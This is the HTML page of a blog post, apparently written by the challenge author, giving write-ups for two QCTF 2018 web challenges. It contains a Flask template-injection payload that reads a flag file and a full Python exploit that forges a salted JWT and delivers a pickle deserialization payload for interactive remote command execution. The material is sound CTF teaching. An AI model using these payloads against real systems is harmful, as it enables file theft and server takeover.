@@ -1,0 +1,516 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  <!-- hexo-inject:begin --><!-- hexo-inject:end --><meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=2">
+<meta name="theme-color" content="#222">
+<meta name="generator" content="Hexo 4.2.0">
+  <link rel="apple-touch-icon" sizes="180x180" href="/images/apple-touch-icon-next.png">
+  <link rel="icon" type="image/png" sizes="32x32" href="/images/favicon.png">
+  <link rel="icon" type="image/png" sizes="16x16" href="/images/favicon.png">
+  <link rel="mask-icon" href="/images/logo.svg" color="#222">
+
+<link rel="stylesheet" href="/css/main.css">
+
+
+<link rel="stylesheet" href="/lib/font-awesome/css/font-awesome.min.css">
+  <link rel="stylesheet" href="//cdn.jsdelivr.net/gh/fancyapps/fancybox@3/dist/jquery.fancybox.min.css">
+  <link rel="stylesheet" href="/lib/pace/pace-theme-minimal.min.css">
+  <script src="/lib/pace/pace.min.js"></script>
+
+<script id="hexo-configurations">
+    var NexT = window.NexT || {};
+    var CONFIG = {"hostname":"srpopty.github.io","root":"/","scheme":"Muse","version":"7.7.2","exturl":false,"sidebar":{"position":"left","display":"post","padding":18,"offset":12,"onmobile":false},"copycode":{"enable":false,"show_result":false,"style":null},"back2top":{"enable":true,"sidebar":false,"scrollpercent":false},"bookmark":{"enable":false,"color":"#222","save":"auto"},"fancybox":true,"mediumzoom":false,"lazyload":false,"pangu":false,"comments":{"style":"tabs","active":null,"storage":true,"lazyload":false,"nav":null},"algolia":{"hits":{"per_page":10},"labels":{"input_placeholder":"Search for Posts","hits_empty":"We didn't find any results for the search: ${query}","hits_stats":"${hits} results found in ${time} ms"}},"localsearch":{"enable":false,"trigger":"auto","top_n_per_article":1,"unescape":false,"preload":false},"motion":{"enable":true,"async":false,"transition":{"post_block":"fadeIn","post_header":"slideDownIn","post_body":"slideDownIn","coll_header":"slideLeftIn","sidebar":"slideUpIn"}}};
+  </script>
+
+  <meta name="description" content="QCTF 2018 confusuion writeup.">
+<meta property="og:type" content="article">
+<meta property="og:title" content="QCTF2018 Confusion Writeup">
+<meta property="og:url" content="https://srpopty.github.io/2018/07/16/QCTF2018-Confusion-Writeup/index.html">
+<meta property="og:site_name" content="Shadow Gallery">
+<meta property="og:description" content="QCTF 2018 confusuion writeup.">
+<meta property="og:locale" content="en_US">
+<meta property="og:image" content="https://srpopty.github.io/2018/07/16/QCTF2018-Confusion-Writeup/TIM%E6%88%AA%E5%9B%BE20180715082911.png">
+<meta property="og:image" content="https://srpopty.github.io/2018/07/16/QCTF2018-Confusion-Writeup/RZD@7C54NA5SQL42X.png">
+<meta property="og:image" content="https://srpopty.github.io/2018/07/16/QCTF2018-Confusion-Writeup/PythonVsPhp.png">
+<meta property="og:image" content="https://srpopty.github.io/2018/07/16/QCTF2018-Confusion-Writeup/TIM%E6%88%AA%E5%9B%BE20180715084603.png">
+<meta property="og:image" content="https://srpopty.github.io/2018/07/16/QCTF2018-Confusion-Writeup/TIM%E6%88%AA%E5%9B%BE20180715085755.png">
+<meta property="og:image" content="https://srpopty.github.io/2018/07/16/QCTF2018-Confusion-Writeup/TIM%E6%88%AA%E5%9B%BE20180715090215.png">
+<meta property="og:image" content="https://srpopty.github.io/2018/07/16/QCTF2018-Confusion-Writeup/TIM%E6%88%AA%E5%9B%BE20180715091118.png">
+<meta property="og:image" content="https://srpopty.github.io/2018/07/16/QCTF2018-Confusion-Writeup/TIM%E6%88%AA%E5%9B%BE20180715091600.png">
+<meta property="og:image" content="https://srpopty.github.io/2018/07/16/QCTF2018-Confusion-Writeup/TIM%E6%88%AA%E5%9B%BE20180715092347.png">
+<meta property="article:published_time" content="2018-07-16T02:20:46.000Z">
+<meta property="article:modified_time" content="2020-08-11T08:44:24.241Z">
+<meta property="article:author" content="Srpopty">
+<meta property="article:tag" content="WriteUp">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:image" content="https://srpopty.github.io/2018/07/16/QCTF2018-Confusion-Writeup/TIM%E6%88%AA%E5%9B%BE20180715082911.png">
+
+<link rel="canonical" href="https://srpopty.github.io/2018/07/16/QCTF2018-Confusion-Writeup/">
+
+
+<script id="page-configurations">
+  // https://hexo.io/docs/variables.html
+  CONFIG.page = {
+    sidebar: "",
+    isHome : false,
+    isPost : true
+  };
+</script>
+
+  <title>QCTF2018 Confusion Writeup | Shadow Gallery</title>
+  
+
+
+
+
+
+
+  <noscript>
+  <style>
+  .use-motion .brand,
+  .use-motion .menu-item,
+  .sidebar-inner,
+  .use-motion .post-block,
+  .use-motion .pagination,
+  .use-motion .comments,
+  .use-motion .post-header,
+  .use-motion .post-body,
+  .use-motion .collection-header { opacity: initial; }
+
+  .use-motion .site-title,
+  .use-motion .site-subtitle {
+    opacity: initial;
+    top: initial;
+  }
+
+  .use-motion .logo-line-before i { left: initial; }
+  .use-motion .logo-line-after i { right: initial; }
+  </style>
+</noscript>
+
+<link rel="alternate" href="/atom.xml" title="Shadow Gallery" type="application/atom+xml"><!-- hexo-inject:begin --><!-- hexo-inject:end -->
+</head>
+
+<body itemscope itemtype="http://schema.org/WebPage">
+  <!-- hexo-inject:begin --><!-- hexo-inject:end --><div class="container use-motion">
+    <div class="headband"></div>
+
+    <header class="header" itemscope itemtype="http://schema.org/WPHeader">
+      <div class="header-inner"><div class="site-brand-container">
+  <div class="site-nav-toggle">
+    <div class="toggle" aria-label="Toggle navigation bar">
+      <span class="toggle-line toggle-line-first"></span>
+      <span class="toggle-line toggle-line-middle"></span>
+      <span class="toggle-line toggle-line-last"></span>
+    </div>
+  </div>
+
+  <div class="site-meta">
+
+    <div>
+      <a href="/" class="brand" rel="start">
+        <span class="logo-line-before"><i></i></span>
+        <span class="site-title">Shadow Gallery</span>
+        <span class="logo-line-after"><i></i></span>
+      </a>
+    </div>
+        <p class="site-subtitle">Live in the shadow</p>
+  </div>
+
+  <div class="site-nav-right">
+    <div class="toggle popup-trigger">
+    </div>
+  </div>
+</div>
+
+
+<nav class="site-nav">
+  
+  <ul id="menu" class="menu">
+        <li class="menu-item menu-item-home">
+
+    <a href="/" rel="section"><i class="fa fa-fw fa-home"></i>Home</a>
+
+  </li>
+        <li class="menu-item menu-item-tags">
+
+    <a href="/tags/" rel="section"><i class="fa fa-fw fa-tags"></i>Tags</a>
+
+  </li>
+        <li class="menu-item menu-item-categories">
+
+    <a href="/categories/" rel="section"><i class="fa fa-fw fa-th"></i>Categories</a>
+
+  </li>
+        <li class="menu-item menu-item-archives">
+
+    <a href="/archives/" rel="section"><i class="fa fa-fw fa-archive"></i>Archives</a>
+
+  </li>
+  </ul>
+
+</nav>
+</div>
+    </header>
+
+    
+  <div class="back-to-top">
+    <i class="fa fa-arrow-up"></i>
+    <span>0%</span>
+  </div>
+  <div class="reading-progress-bar"></div>
+
+
+    <main class="main">
+      <div class="main-inner">
+        <div class="content-wrap">
+          
+
+          <div class="content">
+            
+
+  <div class="posts-expand">
+      
+  
+  
+  <article itemscope itemtype="http://schema.org/Article" class="post-block " lang="en">
+    <link itemprop="mainEntityOfPage" href="https://srpopty.github.io/2018/07/16/QCTF2018-Confusion-Writeup/">
+
+    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
+      <meta itemprop="image" content="/images/avatar.gif">
+      <meta itemprop="name" content="Srpopty">
+      <meta itemprop="description" content="">
+    </span>
+
+    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
+      <meta itemprop="name" content="Shadow Gallery">
+    </span>
+      <header class="post-header">
+        <h1 class="post-title" itemprop="name headline">
+          QCTF2018 Confusion Writeup
+        </h1>
+
+        <div class="post-meta">
+            <span class="post-meta-item">
+              <span class="post-meta-item-icon">
+                <i class="fa fa-calendar-o"></i>
+              </span>
+              <span class="post-meta-item-text">Posted on</span>
+
+              <time title="Created: 2018-07-16 10:20:46" itemprop="dateCreated datePublished" datetime="2018-07-16T10:20:46+08:00">2018-07-16</time>
+            </span>
+              <span class="post-meta-item">
+                <span class="post-meta-item-icon">
+                  <i class="fa fa-calendar-check-o"></i>
+                </span>
+                <span class="post-meta-item-text">Edited on</span>
+                <time title="Modified: 2020-08-11 16:44:24" itemprop="dateModified" datetime="2020-08-11T16:44:24+08:00">2020-08-11</time>
+              </span>
+            <span class="post-meta-item">
+              <span class="post-meta-item-icon">
+                <i class="fa fa-folder-o"></i>
+              </span>
+              <span class="post-meta-item-text">In</span>
+                <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
+                  <a href="/categories/CTF/" itemprop="url" rel="index"><span itemprop="name">CTF</span></a>
+                </span>
+            </span>
+
+          
+            <div class="post-description">QCTF 2018 confusuion writeup.</div>
+
+        </div>
+      </header>
+
+    
+    
+    
+    <div class="post-body" itemprop="articleBody">
+
+      
+        <h1 id="Confusion1"><a href="#Confusion1" class="headerlink" title="Confusion1"></a>Confusion1</h1><p>一进来浏览网站发现什么也没有，两个页面login.php和register.php全是404</p>
+<blockquote>
+<p>虽然题目描述里专门讲了不要使用扫描器，但是很多师傅还是非要用扫描器疯狂扫，比赛才刚开始1个小时日志就疯涨到了200M，后面不得已鄙人才着急写了个封IP的脚本，但是可能规则有点严，误封了不少人的IP，这都是后话了</p>
+</blockquote>
+<p>既然网站什么也没有，但是题目还是要做的，继续浏览网站，细心点的师傅可以发现在404页面里给了flag的路径<br><img src="/2018/07/16/QCTF2018-Confusion-Writeup/TIM%E6%88%AA%E5%9B%BE20180715082911.png" alt></p>
+<p>那么这个题的目的肯定就是要想办法读到flag文件，要读文件那就肯定要有用户输入，但是整个网站并没有可以和用户交互的地方，除了404页面url部分</p>
+<p>有经验的师傅肯定做过其他比赛中有404页面url部分SSTI的题，这个题也是一样的，没有经验的萌新就只能一步步的试了，总之这个网站可以控制输出的地方只有404的url</p>
+<p>测试<br><img src="/2018/07/16/QCTF2018-Confusion-Writeup/RZD@7C54NA5SQL42X.png" alt></p>
+<p>所以这里存在SSTI，之后照着思路往下走，不细心的师傅可能走PHP的SSTI了，因为整个站鄙人都伪装成了Apache+PHP，其实整个站使用Python flask实现的，伪装的并不完美，如果师傅做题的时候不小心弄出个500，可能就会暴露真实的服务</p>
+<p>现在仔细看首页的那张图应该就能明白那张图片的意思了2333333333<br><img src="/2018/07/16/QCTF2018-Confusion-Writeup/PythonVsPhp.png" alt></p>
+<p>另外题目里对一些关键字做了过滤<br><img src="/2018/07/16/QCTF2018-Confusion-Writeup/TIM%E6%88%AA%E5%9B%BE20180715084603.png" alt></p>
+<p>用request.args绕过即可<br>payload:</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&#123;&#123;&#39;&#39;[request.args.a][request.args.b][2][request.args.c]()[40](&#39;&#x2F;opt&#x2F;flag_1de36dff62a3a54ecfbc6e1fd2ef0ad1.txt&#39;)[request.args.d]()&#125;&#125;?a&#x3D;__class__&amp;b&#x3D;__mro__&amp;c&#x3D;__subclasses__&amp;d&#x3D;read</span><br></pre></td></tr></table></figure>
+
+<p>另外题目里除了flag，还给了一个salt，也拿上，下一个题会用到</p>
+<hr>
+<h1 id="Confusion2"><a href="#Confusion2" class="headerlink" title="Confusion2"></a>Confusion2</h1><p>这个题和Confusion1相比多了login和register，所以肯定要用到注册和登录<br>另外题目描述里讲了</p>
+<blockquote>
+<p> I find something STRANGE when Alice said hello to me.</p>
+</blockquote>
+<p>登录成功之后首页刚好会出现一个”hello”+用户名<br><img src="/2018/07/16/QCTF2018-Confusion-Writeup/TIM%E6%88%AA%E5%9B%BE20180715085755.png" alt></p>
+<p>所以就需要关注这个hello是怎么来的</p>
+<p>从注册到登录，抓个包发现cookie比较奇怪，除了PHPSESSID（当然这是假的23333）还有一个token，经过分析发现这是一个JWT<br><img src="/2018/07/16/QCTF2018-Confusion-Writeup/TIM%E6%88%AA%E5%9B%BE20180715090215.png" alt></p>
+<p>这并不是标准的JWT,是鄙人自己实现的一个（为了师傅们做题方便用的算法是sha256），然后分析一下payload里是什么</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">&#123;</span><br><span class="line">  &quot;data&quot;: &quot;O:4:\&quot;User\&quot;:2:&#123;s:9:\&quot;user_data\&quot;;s:59:\&quot;(lp1\nVsrpopty\np2\naS&#39;0af1ebb83911a420f08e94e6028b93ad&#39;\np3\na.\&quot;;&#125;&quot;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<p>很明显data是一个PHP的序列化字符串，这时候很多师傅可能就会开始怀疑了，这个网站到底是个PHP还是个Python？接着分析下这个序列化字符串</p>
+<p>User对象中有一个user_data的成员，值为</p>
+<blockquote>
+<p>(lp1\nVsrpopty\np2\naS’0af1ebb83911a420f08e94e6028b93ad’\np3\na.</p>
+</blockquote>
+<p>有经验的师傅这时候就可以看出来这是一个Python序列化的字符串，而且这个字符串中出现了两个很突出的部分：登录的用户名和一串hash，而这串hash就是用户名的md5<br><img src="/2018/07/16/QCTF2018-Confusion-Writeup/TIM%E6%88%AA%E5%9B%BE20180715091118.png" alt></p>
+<p>把这个字符串手动在python里反序列化一下会发现这是一个列表，第一个元素是用户名，第二个元素是用户名的md5<br><img src="/2018/07/16/QCTF2018-Confusion-Writeup/TIM%E6%88%AA%E5%9B%BE20180715091600.png" alt></p>
+<p>所以接下来就是利用python中class的__reduce__方法反序列化RCE，但是首先要想办法绕过JWT的验证</p>
+<p>前面已经知道JWT中的算法是sha256，但是题目描述中说</p>
+<blockquote>
+<p>PS: Alice said she likes add salts when she was cooking.</p>
+</blockquote>
+<p>Hint中也提到</p>
+<blockquote>
+<p>hint：Alice likes adding salt at the LAST.</p>
+</blockquote>
+<p>在加上Confusion1中拿到的salt到现在都没有用到，所以sha256中需要加上前一道题中拿到的salt，根据Hint里提到的，salt需要加在最后，这样就能绕过JWT的验证了</p>
+<p>需要注意一下的是在使用salt的时候格式是<br><code>jwt_header + &#39;.&#39; + jwt_payload + salt</code></p>
+<p>可能很多人在payload和salt之间也多加了个点导致JWT一直过不去<br>鄙人的锅，很抱歉鄙人没有讲清楚导致很多师傅卡在这里了</p>
+<p>另外需要注意就是python反序列化的payload放在PHP的序列化字符串中也要注意PHP序列化的格式，字符数量必须和前面的数字相等</p>
+<p>最后在opt中找到flag<br><img src="/2018/07/16/QCTF2018-Confusion-Writeup/TIM%E6%88%AA%E5%9B%BE20180715092347.png" alt></p>
+<p>附exp:</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> cPickle</span><br><span class="line"><span class="keyword">import</span> os</span><br><span class="line"><span class="keyword">import</span> sys</span><br><span class="line"><span class="keyword">import</span> base64</span><br><span class="line"><span class="keyword">import</span> hashlib</span><br><span class="line"><span class="keyword">import</span> json</span><br><span class="line"><span class="keyword">import</span> Cookie</span><br><span class="line"><span class="keyword">import</span> commands</span><br><span class="line"><span class="keyword">import</span> MD5proof</span><br><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"><span class="keyword">import</span> re</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> os.name != <span class="string">'posix'</span>:</span><br><span class="line">    <span class="keyword">print</span> <span class="string">'This script must be run on Linux!'</span></span><br><span class="line">    sys.exit(<span class="number">1</span>)</span><br><span class="line"></span><br><span class="line">sess = requests.Session()</span><br><span class="line">url = <span class="string">'http://xxxx:xxxx/'</span></span><br><span class="line">md5proof = MD5proof.Md5Proof(<span class="number">0</span>, <span class="number">6</span>)</span><br><span class="line">SALT = <span class="string">'_Y0uW1llN3verKn0w1t_'</span></span><br><span class="line">username = <span class="string">'srpopty'</span></span><br><span class="line">password = <span class="string">'srpopty'</span></span><br><span class="line">cmd = <span class="string">'ls'</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">base64_url_encode</span><span class="params">(text)</span>:</span></span><br><span class="line">    <span class="keyword">return</span> base64.b64encode(text).replace(<span class="string">'+'</span>, <span class="string">'-'</span>).replace(<span class="string">'/'</span>, <span class="string">'_'</span>).replace(<span class="string">'='</span>, <span class="string">''</span>)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">base64_url_decode</span><span class="params">(text)</span>:</span></span><br><span class="line">    text = text.replace(<span class="string">'-'</span>, <span class="string">'+'</span>).replace(<span class="string">'_'</span>, <span class="string">'/'</span>)</span><br><span class="line">    <span class="keyword">while</span> <span class="literal">True</span>:</span><br><span class="line">        <span class="keyword">try</span>:</span><br><span class="line">            result = base64.b64decode(text)</span><br><span class="line">        <span class="keyword">except</span> TypeError:</span><br><span class="line">            text += <span class="string">'='</span></span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            <span class="keyword">break</span></span><br><span class="line">    <span class="keyword">return</span> result</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">PickleRce</span><span class="params">(object)</span>:</span></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">__reduce__</span><span class="params">(self)</span>:</span></span><br><span class="line">        <span class="keyword">return</span> commands.getoutput, (cmd, )</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">register</span><span class="params">(username, password)</span>:</span></span><br><span class="line">    <span class="keyword">while</span> <span class="literal">True</span>:</span><br><span class="line">        verify = md5proof.Proof(re.findall(<span class="string">'\'\),0,6\) === \'(.*?)\'&lt;/span&gt;'</span>,</span><br><span class="line">                                           sess.get(url + <span class="string">'login.php'</span>, allow_redirects=<span class="literal">False</span>).content)[<span class="number">0</span>])</span><br><span class="line">        <span class="keyword">if</span> len(verify) &gt; <span class="number">0</span> <span class="keyword">and</span> <span class="string">'*'</span> <span class="keyword">not</span> <span class="keyword">in</span> verify:</span><br><span class="line">            <span class="keyword">break</span></span><br><span class="line">    data = &#123;</span><br><span class="line">        <span class="string">'username'</span>: username,</span><br><span class="line">        <span class="string">'password'</span>: password,</span><br><span class="line">        <span class="string">'verify'</span>: verify</span><br><span class="line">    &#125;</span><br><span class="line">    ret = sess.post(url + <span class="string">'register.php'</span>, data=data, allow_redirects=<span class="literal">False</span>)</span><br><span class="line">    <span class="keyword">if</span> <span class="string">'success'</span> <span class="keyword">in</span> ret.content:</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">True</span></span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        <span class="keyword">print</span> <span class="string">'[!] Register failed!'</span></span><br><span class="line">        <span class="keyword">print</span> ret.content</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">False</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">login</span><span class="params">(username, password)</span>:</span></span><br><span class="line">    <span class="keyword">while</span> <span class="literal">True</span>:</span><br><span class="line">        verify = md5proof.Proof(re.findall(<span class="string">'\'\),0,6\) === \'(.*?)\'&lt;/span&gt;'</span>,</span><br><span class="line">                                           sess.get(url + <span class="string">'login.php'</span>, allow_redirects=<span class="literal">False</span>).content)[<span class="number">0</span>])</span><br><span class="line">        <span class="keyword">if</span> len(verify) &gt; <span class="number">0</span> <span class="keyword">and</span> <span class="string">'*'</span> <span class="keyword">not</span> <span class="keyword">in</span> verify:</span><br><span class="line">            <span class="keyword">break</span></span><br><span class="line">    data = &#123;</span><br><span class="line">        <span class="string">'username'</span>: username,</span><br><span class="line">        <span class="string">'password'</span>: password,</span><br><span class="line">        <span class="string">'verify'</span>: verify</span><br><span class="line">    &#125;</span><br><span class="line">    ret = sess.post(url + <span class="string">'login.php'</span>, data=data, allow_redirects=<span class="literal">False</span>)</span><br><span class="line">    <span class="keyword">if</span> <span class="string">'success'</span> <span class="keyword">in</span> ret.content:</span><br><span class="line">        <span class="keyword">return</span> ret</span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        <span class="keyword">print</span> <span class="string">'[!] Login failed!'</span></span><br><span class="line">        <span class="keyword">print</span> ret.content</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">None</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">create_jwt</span><span class="params">(kid, data)</span>:</span></span><br><span class="line">    jwt_header = base64_url_encode(</span><br><span class="line">        <span class="string">'&#123;"typ":"JWT","alg":"sha256","kid":"%d"&#125;'</span> % kid)</span><br><span class="line">    jwt_payload = base64_url_encode(<span class="string">'&#123;"data":"%s"&#125;'</span> % data)</span><br><span class="line">    jwt_signature = base64_url_encode(hashlib.sha256(</span><br><span class="line">        jwt_header + <span class="string">'.'</span> + jwt_payload + SALT).hexdigest())</span><br><span class="line">    <span class="keyword">return</span> jwt_header + <span class="string">'.'</span> + jwt_payload + <span class="string">'.'</span> + jwt_signature</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">serialize</span><span class="params">()</span>:</span></span><br><span class="line">    payload = cPickle.dumps([PickleRce(), PickleRce()])</span><br><span class="line">    data = json.dumps(<span class="string">'O:4:"User":2:&#123;s:9:"user_data";s:%d:"%s";&#125;'</span> % (</span><br><span class="line">        len(payload), payload))[<span class="number">1</span>:<span class="number">-1</span>]</span><br><span class="line">    <span class="keyword">print</span> data</span><br><span class="line">    <span class="keyword">return</span> data</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> register(username, password) <span class="keyword">is</span> <span class="keyword">not</span> <span class="literal">None</span>:</span><br><span class="line">    login_result = login(username, password)</span><br><span class="line">    <span class="keyword">if</span> login_result <span class="keyword">is</span> <span class="keyword">not</span> <span class="literal">None</span>:</span><br><span class="line">        <span class="keyword">try</span>:</span><br><span class="line">            <span class="keyword">while</span> <span class="literal">True</span>:</span><br><span class="line">                cmd = raw_input(<span class="string">'&gt;&gt;&gt; '</span>)</span><br><span class="line">                cookies = login_result.cookies</span><br><span class="line">                <span class="comment"># print '[*] Old Cookie token: ' + cookies['token']</span></span><br><span class="line">                jwt = create_jwt(int(re.findall(<span class="string">'"kid":"(.*?)"'</span>, base64_url_decode(</span><br><span class="line">                    login_result.cookies[<span class="string">'token'</span>].split(<span class="string">'.'</span>)[<span class="number">0</span>]))[<span class="number">0</span>]), serialize())</span><br><span class="line">                new_token = Cookie.SimpleCookie().value_encode(jwt)[<span class="number">1</span>]</span><br><span class="line">                <span class="comment"># print '[*] New Cookie token: ' + new_token</span></span><br><span class="line">                new_cookies = &#123;</span><br><span class="line">                    <span class="string">'PHPSESSID'</span>: cookies[<span class="string">'PHPSESSID'</span>],</span><br><span class="line">                    <span class="string">'token'</span>: new_token</span><br><span class="line">                &#125;</span><br><span class="line">                ret = requests.get(url + <span class="string">'index.php'</span>,</span><br><span class="line">                                   allow_redirects=<span class="literal">False</span>, cookies=new_cookies)</span><br><span class="line">                <span class="keyword">print</span> <span class="string">'[*] RCE result: '</span> + re.findall(<span class="string">'&lt;p class="hello"&gt;Hello ([\s\S]*?)&lt;/p&gt;'</span>, ret.content)[<span class="number">0</span>]</span><br><span class="line">        <span class="keyword">except</span> KeyboardInterrupt:</span><br><span class="line">            <span class="keyword">print</span> <span class="string">'\nExit.'</span></span><br></pre></td></tr></table></figure>
+
+<hr>
+<h1 id="结语"><a href="#结语" class="headerlink" title="结语"></a>结语</h1><p>这次比赛的确很难受，题目里说了别用扫描器，还是有很多人疯狂扫，最后把容器都扫崩了。赶出来一个封IP的脚本，虽然限制了扫描器，但是规则可能有点严（感觉也可能是玄学因素。。。），一开始3秒钟30个包封IP（这个的确鄙人也感觉太严格了），不少人被误封，后来改成3秒钟50个包，有些人说被误封了，最后3秒钟80个包还有说误封的。。。。到最后只能改成1秒80个包还是说有被误封的- -！日志量太大也实在不好审日志，所以最后只能把所有IP都解封，解封没多久又有上扫描器的。。。。</p>
+<p>另外在日志中也能看到有些搅屎棍，的确，不得不说国内CTF比赛的环境实在是太恶劣了，自己做完了的题不想让别人做，还是多去打打国外的比赛吧。</p>
+<p>最后的确鄙人也是太垃圾了，很抱歉没有给各位师傅创造一个良好的解题环境，以后鄙人一定更加努力！</p>
+
+    </div>
+
+    
+    
+    
+
+      <footer class="post-footer">
+          <div class="post-tags">
+              <a href="/tags/WriteUp/" rel="tag"># WriteUp</a>
+          </div>
+
+        
+
+
+        
+    <div class="post-nav">
+      <div class="post-nav-item">
+    <a href="/2018/06/18/The-creed-The-belief-The-symbol/" rel="prev" title="The creed, The belief, The symbol">
+      <i class="fa fa-chevron-left"></i> The creed, The belief, The symbol
+    </a></div>
+      <div class="post-nav-item">
+    <a href="/2018/07/27/%E7%99%BE%E5%B9%B4%E4%BA%BA%E5%AF%BF%E4%BF%9D%E9%99%A9%E8%82%A1%E4%BB%BD%E6%9C%89%E9%99%90%E5%85%AC%E5%8F%B8%E7%BD%91%E7%AB%99%E8%A1%A8%E5%8D%95%E9%AA%8C%E8%AF%81%E7%A0%81%E7%BB%95%E8%BF%87/" rel="next" title="百年人寿保险股份有限公司网站表单验证码绕过">
+      百年人寿保险股份有限公司网站表单验证码绕过 <i class="fa fa-chevron-right"></i>
+    </a></div>
+    </div>
+      </footer>
+    
+  </article>
+  
+  
+  
+
+  </div>
+
+
+          </div>
+          
+    <div class="comments" id="gitalk-container"></div>
+
+<script>
+  window.addEventListener('tabs:register', () => {
+    let { activeClass } = CONFIG.comments;
+    if (CONFIG.comments.storage) {
+      activeClass = localStorage.getItem('comments_active') || activeClass;
+    }
+    if (activeClass) {
+      let activeTab = document.querySelector(`a[href="#comment-${activeClass}"]`);
+      if (activeTab) {
+        activeTab.click();
+      }
+    }
+  });
+  if (CONFIG.comments.storage) {
+    window.addEventListener('tabs:click', event => {
+      if (!event.target.matches('.tabs-comment .tab-content .tab-pane')) return;
+      let commentClass = event.target.classList[1];
+      localStorage.setItem('comments_active', commentClass);
+    });
+  }
+</script>
+
+        </div>
+          
+  
+  <div class="toggle sidebar-toggle">
+    <span class="toggle-line toggle-line-first"></span>
+    <span class="toggle-line toggle-line-middle"></span>
+    <span class="toggle-line toggle-line-last"></span>
+  </div>
+
+  <aside class="sidebar">
+    <div class="sidebar-inner">
+
+      <ul class="sidebar-nav motion-element">
+        <li class="sidebar-nav-toc">
+          Table of Contents
+        </li>
+        <li class="sidebar-nav-overview">
+          Overview
+        </li>
+      </ul>
+
+      <!--noindex-->
+      <div class="post-toc-wrap sidebar-panel">
+          <div class="post-toc motion-element"><ol class="nav"><li class="nav-item nav-level-1"><a class="nav-link" href="#Confusion1"><span class="nav-number">1.</span> <span class="nav-text">Confusion1</span></a></li><li class="nav-item nav-level-1"><a class="nav-link" href="#Confusion2"><span class="nav-number">2.</span> <span class="nav-text">Confusion2</span></a></li><li class="nav-item nav-level-1"><a class="nav-link" href="#结语"><span class="nav-number">3.</span> <span class="nav-text">结语</span></a></li></ol></div>
+      </div>
+      <!--/noindex-->
+
